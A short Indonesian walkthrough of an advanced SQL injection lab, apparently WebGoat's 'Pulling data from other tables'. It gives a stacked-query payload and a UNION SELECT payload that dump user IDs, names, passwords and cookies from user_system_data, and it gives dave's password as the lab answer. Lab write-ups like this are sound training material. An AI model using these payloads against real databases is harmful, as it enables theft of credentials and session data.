# SQL Injection (advanced)
## Try It! Pulling data from other tables
- Masukkan query injection sebagai berikut lalu tekan tombol **Get Account Info**
```sh
'; select * from user_system_data; --
```

- Setelah data tampil, kita dapat menemukan password user dave


- Masukkan password user dave ke field Password dan tekan tombol **Check Password**
```sh
passW0rD
```

- Selain query injection diatas, kita juga bisa memasukkan query sebagai berikut
```sh
' union select userid, user_name, password, cookie, null as c1, null as c2, null as c3 from user_system_data; --
```
